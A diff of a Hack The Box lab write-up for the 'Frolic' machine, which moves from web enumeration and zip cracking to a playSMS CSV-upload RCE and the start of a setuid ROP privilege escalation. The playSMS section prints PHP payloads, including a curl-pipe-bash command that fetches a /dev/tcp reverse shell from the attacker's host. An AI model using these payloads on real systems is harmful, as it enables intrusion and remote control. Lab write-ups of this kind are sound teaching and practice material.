@@ -3,7 +3,7 @@ title: HTB - Valentine Write-up
 author: bigb0ss
 date: 2020-11-16 19:36:00 +0800
 categories: [Hack The Box, Linux, Easy]
-tags: [hackthebox, frolic, js, Ook!, frackzip]
+tags: [hackthebox, frolic, js, Ook!, frackzip, playSMS RCE, binary exploit, rop]
 image: /assets/img/post/htb/frolic/01_infocard.png
 ---
 
@@ -11,9 +11,9 @@ This was an easy difficulty box. Good learning path for:
 * 
 
 
-## Initial Recon
+# Initial Recon
 
-### Nmap
+## Nmap
 
 Let’s begin with an initial port scan:
 
@@ -71,7 +71,7 @@ Host script results:
 ![image](/assets/img/post/htb/frolic/03.png)
 
 
-### Web Directory Enumeration (gobuster)
+## Web Directory Enumeration (gobuster)
 
 Let's run `gobuster` against the web service. 
 
@@ -115,7 +115,7 @@ It found the several interesting directories.
 ![image](/assets/img/post/htb/frolic/06.png)
 
 
-### Source Code Review (c'mon i m hackable Login)
+## Source Code Review (c'mon i m hackable Login)
 
 Next, I quickly checked the source code for the c'mon i m hackable login page and found an interesting JavaScript `login.js`.
 
@@ -130,14 +130,14 @@ The `success.html` was a bunch of weird characters... indicating another puzzle 
 ![image](/assets/img/post/htb/frolic/09.png)
 
 
-### Decoding Ook! Programming Language
+## Decoding Ook! Programming Language
 
 Google search found that this was an `Ook! Programing Language` so I used the online decoder to retrieve the following plain-text from it: `Nothing here check /asdiSIAJJ0QWE9JAS`.
 
 ![image](/assets/img/post/htb/frolic/10.png)
 
 
-### Base64 Encoded Zip File
+## Base64 Encoded Zip File
 
 Next, I went to this directory `http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/`, and there was another challenge. It looked like a base64 encoded string. 
 
@@ -188,7 +188,7 @@ root@kali:~/Documents/htb/box/frolic# fcrackzip -u -D -p /usr/share/wordlists/ro
 PASSWORD FOUND!!!!: pw == password
 ```
 
-### Decoding index.php
+## Decoding index.php
 
 The output file was looking like this:
 
@@ -217,23 +217,131 @@ root@kali:~/Documents/htb/box/frolic# cat index.php | xxd -r -p | tr -d '\r\n' |
 ++..<
 ```
 
-Using the online decoder again `decode.fr`, I was able to recover the plain-text `idkwhatispass`.
+Using the online decoder again `decode.fr`, I was able to recover the plain-text `idkwhatispass`. This could have been a password for `admin` user for the `Node-RED` login; however, it didn't work. Moving on.
 
 ![image](/assets/img/post/htb/frolic/12.png)
 
 
+## Web Directory Enumeration 2 (gobuster)
+
+Next, I did more enumeration against the web directories and found more file under `/dev`. 
+
+```console
+root@kali:/opt# gobuster dir -u http://10.10.10.111:9999/dev/ -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.111:9999/dev/
+[+] Threads:        30
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/11/18 19:45:43 Starting gobuster
+===============================================================
+/test (Status: 200)
+/backup (Status: 301)
+```
+
+When I go to `http://10.10.10.111:9999/dev/backup/`, I can see another directory called `/playsms`. 
+
+![image](/assets/img/post/htb/frolic/13.png)
+
+And it was login page for `playSMS`.
+
+![image](/assets/img/post/htb/frolic/14.png)
+
+
+# Initial Foothold
+
+## playSMS (RCE)
+
+Previously found credential set `admin : idkwhatispass` combo allowed me to login to the `playSMS` application.
+
+![image](/assets/img/post/htb/frolic/15.png)
+
+There is a [public exploit](https://www.exploit-db.com/exploits/42044) for `playSMS` where we can upload a malicious .csv file and do remote code exeuction. 
+
+I create the following .csv file which will simply execute `whoami` command. 
+
+```php
+root@kali:~/Documents/htb/box/frolic# cat bigb0ss.csv 
+<?php echo exec('whoami'); ?>,1
+```
+
+Next, I am uploading this file using `Send from file` function under `My account` drop down menu. 
+
+![image](/assets/img/post/htb/frolic/16.png)
+
+Once I hit `UPLOAD FILE`, we can see that our code gets executed and the user id was `www-data`. 
+
+![image](/assets/img/post/htb/frolic/17.png)
+
+
+## playSMS (Reverse Shell)
+
+I updated my payload as following:
+
+```php
+root@kali:~/Documents/htb/box/frolic# cat bigb0ss.csv 
+<?php echo exec('curl http://10.10.14.31/rev.sh | bash'); ?>,1
+```
+
+It will grep the rev.sh `bash -i >& /dev/tcp/10.10.14.31/9001 0>&1` file from my web server and execute it. Doing that I was able to obtain the reverse shell as `www-data` from the host.
+
+![image](/assets/img/post/htb/frolic/18.png)
+
+
+# Privilege Escalation
+
+## www-data --> root (ROP Exploit)
+
+<b>user.txt</b>
+
+By searching for `user.txt` file, we can read it.
+
+```console
+www-data@frolic:~/html/playsms$ find / -name user.txt 2>/dev/null
+/home/ayush/user.txt
+/var/www/html/backup/user.txt
+
+www-data@frolic:~/html/playsms$ cat /home/ayush/user.txt
+2ab9***REDACTED***2fe0
+```
+
+### Binary Exploit (ROP)
+
+Further enum identified an interesting file called `rop`. It just take the user input and print it. We also know that the binary is owned by `root` so it will be some type of binary challege for privilege escalation.
+
+```console
+www-data@frolic:/home/ayush/.binary$ ls -la
+total 16
+drwxrwxr-x 2 ayush ayush 4096 Sep 25  2018 .
+drwxr-xr-x 3 ayush ayush 4096 Sep 25  2018 ..
+-rwsr-xr-x 1 root  root  7480 Sep 25  2018 rop
+
+www-data@frolic:/home/ayush/.binary$ file rop
+rop: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=59da91c100d138c662b77627b65efbbc9f797394, not stripped
+
+www-data@frolic:/home/ayush/.binary$ ./rop 
+[*] Usage: program <message>
+
+www-data@frolic:/home/ayush/.binary$ ./rop bigb0ss
+[+] Message sent: bigb0ss
+```
+
+Using `nc`, we can tranfer the `rop` file to our local box. 
+
+![image](/assets/img/post/htb/frolic/19.png)
 
 
 
 
 
-## Initial Foothold
 
-
-
-
-
-## Privilege Escalation
 
 
 
